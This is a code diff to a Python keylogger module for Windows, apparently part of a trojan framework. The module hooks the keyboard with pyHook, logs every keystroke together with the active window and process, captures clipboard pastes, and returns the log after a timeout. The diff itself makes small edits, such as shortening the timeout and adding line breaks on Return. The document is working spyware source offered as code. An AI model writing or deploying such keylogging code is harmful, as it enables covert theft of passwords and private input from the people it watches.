@@ -3,7 +3,6 @@ import win32gui
 import pyHook
 import win32clipboard
 import time
-import sys
 
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
@@ -12,7 +11,7 @@ current_window = None
 
 KeyLogs = ""
 start_time = time.time()
-max_time = 15 # 1 minute
+max_time = 10  # 1 minute
 
 
 def get_current_process():
@@ -68,11 +67,12 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipBoardData()
             win32clipboard.CloseClipboard()
-
             KeyLogs += ("[PASTE] - %s\n" % (pasted_value))
 
         else:
             KeyLogs += ("[%s]" % event.Key)
+            if event.Key == "Return":
+                KeyLogs += "\n"
     if time.time() - start_time > max_time:
         ctypes.windll.user32.PostQuitMessage(0)
         return True
@@ -90,5 +90,5 @@ def run(**args):
     # register the hook and execute forever
     kl.HookKeyboard()
     win32gui.PumpMessages()
-
-    return(KeyLogs)
+    
+    return KeyLogs
